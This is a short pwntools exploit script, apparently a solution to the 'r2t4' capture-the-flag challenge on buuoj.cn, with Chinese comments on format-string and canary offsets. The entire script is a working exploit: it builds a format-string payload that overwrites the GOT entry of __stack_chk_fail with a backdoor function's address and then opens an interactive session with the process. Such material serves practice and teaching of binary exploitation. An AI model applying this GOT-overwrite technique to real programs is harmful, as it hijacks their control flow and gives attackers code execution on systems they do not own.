from pwn import *
#from fmtstr_payload import *
context(log_level='debug',arch='amd64')


io=process("./r2t4")
#io=remote("node3.buuoj.cn",29898)
elf=ELF("./r2t4")

#format string 相对偏移为6  canary 位置 (0x30-0x8)/8+6=5 总偏移11

backdoor=0x400626

__stack_chk_fail=elf.got['__stack_chk_fail']

payload=fmtstr_payload(6,{__stack_chk_fail:backdoor})

io.sendline(payload)

#io.recv()

io.interactive()